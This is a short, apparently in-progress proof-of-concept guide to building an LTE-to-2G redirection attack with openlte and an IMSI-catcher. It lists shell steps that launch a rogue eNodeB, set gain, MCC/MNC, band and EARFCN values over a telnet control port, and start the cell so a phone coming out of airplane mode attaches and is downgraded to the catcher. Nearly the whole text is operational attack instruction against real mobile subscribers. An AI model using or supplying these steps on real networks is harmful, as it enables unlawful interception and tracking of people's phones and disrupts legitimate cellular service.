# openlte_redirection_quickinstall

Then build 2G IMSI-Catcher  
Build IMSI-catcher  


Running  
Phone in 2G/3G/4G mode  
This article is in progress and is just a PoC  
The attack step are run the IMSI-catcher into arfcn 514 follow (see Build IMSI-catcher)  
run the 4G redirector as follow  
  
Shell #1  
LTE_fdd_enodeb

Shell #2  
telnet localhost 30000  
write rx_gain 30  
write tx_gain 80  
write mcc 215  
write mnc 15  
write band 7  
write dl_earfcn 3350  
(change with your ue values be careful that the earfcn is in the band)  
  
Then switch the phone in airplane mode and in  localhost:30000 (Shell #2) :  
start  
  
wait… and when you have “ok” answer in shell #2 remove airplane mode and … enjoy !
